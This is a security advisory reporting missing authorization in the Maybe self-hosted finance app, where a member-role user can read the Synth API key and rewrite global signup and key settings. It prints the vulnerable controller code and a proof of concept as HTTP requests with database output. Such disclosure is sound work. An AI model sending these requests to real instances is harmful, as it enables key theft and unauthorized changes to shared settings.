https://github.com/maybe-finance/maybe - "This repository was archived by the owner on Jul 28, 2025. It is now read-only."


## Finding: Non-admin family member can read and modify global self-hosted settings (Synth API key, invite-only flag, email confirmation flag)

Package: maybe-finance/maybe

Affected Versions: All versions through commit 77b5469 (HEAD as of 2026-05-24)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (8.1 High)

CWE: CWE-862 (Missing Authorization)


### Summary
In Maybe self-hosted deployments, `Settings::HostingsController#show` and `#update` are reachable by any authenticated user, including users with the `member` role who joined a family by invitation. A member can read the configured Synth API key in plaintext from the rendered HTML and rewrite the application-wide settings `synth_api_key`, `require_invite_for_signup`, and `require_email_confirmation`. The adjacent action `clear_cache` in the same controller is correctly gated by `ensure_admin`, but the much more impactful `update` and `show` actions are not.

### Details

File: `app/controllers/settings/hostings_controller.rb`

```ruby
class Settings::HostingsController < ApplicationController
  layout "settings"

  guard_feature unless: -> { self_hosted? }

  before_action :ensure_admin, only: :clear_cache   # <-- only clear_cache is gated

  def show
    synth_provider = Provider::Registry.get_provider(:synth)
    @synth_usage = synth_provider&.usage
  end

  def update
    if hosting_params.key?(:require_invite_for_signup)
      Setting.require_invite_for_signup = hosting_params[:require_invite_for_signup]
    end
    if hosting_params.key?(:require_email_confirmation)
      Setting.require_email_confirmation = hosting_params[:require_email_confirmation]
    end
    if hosting_params.key?(:synth_api_key)
      Setting.synth_api_key = hosting_params[:synth_api_key]
    end
    redirect_to settings_hosting_path, notice: t(".success")
  ...
  private
    def hosting_params
      params.require(:setting).permit(:require_invite_for_signup, :require_email_confirmation, :synth_api_key)
    end

    def ensure_admin
      redirect_to settings_hosting_path, alert: t(".not_authorized") unless Current.user.admin?
    end
end
```

`guard_feature unless: -> { self_hosted? }` only restricts the controller to self-hosted mode. It does not enforce an authorization role. The `ensure_admin` filter is wired to `clear_cache` only, leaving `show` and `update` open to every authenticated user.

The `show` action renders `app/views/settings/hostings/_synth_settings.html.erb`, which writes the current key into the form value attribute regardless of input type:

```erb
<%= form.text_field :synth_api_key,
                    type: "password",
                    value: ENV.fetch("SYNTH_API_KEY", Setting.synth_api_key),
                    ...
```

A `type="password"` field still serialises its `value` attribute into the HTML, so any authenticated user receiving the page can read the configured key in plaintext.

`Setting` is global state (`RailsSettings::Base`), not family-scoped, so any write affects every user and family on the instance.

### PoC

Prerequisites:
- Self-hosted Maybe instance (SELF_HOSTED=true), default `compose.example.yml`.
- Admin account (administrator of family A).
- Member account (invited to family A with role=member). Standard invitation flow.

Tested against commit `77b5469` using `ghcr.io/maybe-finance/maybe:latest`.

Step 1. Log in as the member and confirm role.

```
POST /sessions
Content-Type: application/x-www-form-urlencoded

authenticity_token=...&email=member@test.com&password=Aa@1abcdef
```

```
SELECT email, role FROM users;
      email      |  role
-----------------+--------
 admin@test.com  | admin
 member@test.com | member
```

Step 2. As member, fetch the hosting settings page and read the Synth key from the HTML.

```
GET /settings/hosting HTTP/1.1
Cookie: session_token=<member session cookie>
```

Response (200 OK) contains the input element with the key in plaintext:

```html
<input class="form-field__input" type="password" placeholder="Enter your API key here"
       value="REAL_SYNTH_KEY_HERE"
       name="setting[synth_api_key]" id="setting_synth_api_key" />
```

Step 3. As member, overwrite the global settings.

```
PATCH /settings/hosting HTTP/1.1
Cookie: session_token=<member session cookie>
X-CSRF-Token: <token>
Content-Type: application/x-www-form-urlencoded

setting[synth_api_key]=PWNED_BY_MEMBER_USER&setting[require_invite_for_signup]=true&setting[require_email_confirmation]=false&authenticity_token=<token>
```

Response: `302 Found` to `/settings/hosting`.

Database state after the request:

```
SELECT var, value FROM settings;
            var             |          value
----------------------------+--------------------------
 require_invite_for_signup  | --- true
 require_email_confirmation | --- false
 synth_api_key              | --- PWNED_BY_MEMBER_USER
```

Step 4. For comparison, the adjacent action `clear_cache` in the same controller does enforce `ensure_admin` and is correctly inaccessible to the same member.

### Impact

Self-hosted Maybe instances with more than one user.

A `member` user (the lowest non-anonymous role, typically a family member joined by invitation) can:

1. Read the operator's Synth API key in plaintext from `GET /settings/hosting`. The key controls a paid third party market data subscription; leaking it allows quota theft and operator billing impact.
2. Overwrite `Setting.synth_api_key` to either invalidate market data fetches for the whole instance (denial of a major feature) or substitute an attacker controlled key.
3. Toggle `Setting.require_invite_for_signup` to bypass an operator decision to lock down signup, opening the instance to public registration.
4. Toggle `Setting.require_email_confirmation` to disable email confirmation for new signups, enabling registration with arbitrary unverified addresses (useful for impersonation against the `password_resets#create` flow which discloses nothing but the mailer would not require ownership of the address before allowing future operations).

Because the affected settings are application wide rather than family scoped, the impact crosses tenant boundaries on shared self-hosted deployments.
